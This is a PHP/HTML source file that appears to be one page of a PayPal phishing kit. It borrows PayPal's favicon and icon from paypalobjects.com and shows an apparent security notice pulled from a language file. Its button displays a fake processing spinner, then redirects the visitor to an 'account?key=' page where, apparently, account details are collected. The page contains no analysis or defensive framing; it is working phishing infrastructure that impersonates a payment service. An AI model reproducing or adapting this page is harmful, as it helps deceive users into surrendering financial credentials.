<?php
//error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once '../lang.php';
?>
    <!DOCTYPE html>
    <html>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
        <title>
            <?php echo $notice['we'];?>
        </title>
        <link rel="stylesheet" href="assets/css/unusual.css">
    </head>

    <body>
        <div>
            <div class="centered">
                <div style="text-align:center">
                    <header>
                        <div class="logo"></div>
                    </header>
                    <div>
                        <h1><?php echo $notice['we'];?></h1>
                        <div>
                            <p class="text">
                                <?php echo $notice['weneed'];?>
                            </p>
                        </div>
                        <input type="button" class="button" value="<?php echo $notice['but'];?>" id="btn">
                    </div>
                </div>
                <div class="hide" id="rotate">
                    <div class="spinner">
                        <div class="rotate"></div>
                        <div class="processing">
                            <?php echo $account['processing'];?>...</div>
                    </div>
                    <div class="overlay"></div>
                </div>
            </div>
        </div>
        <?php include "assets/static/footer.html" ?>
            <script>
                document.getElementById("btn").onclick = function() {
                    document.getElementById("rotate").classList.remove("hide");
                    setTimeout(function() {
                        window.location.href = "account?key=<?php echo $key;?>"
                    }, 1800)
                };
            </script>
    </body>

    </html>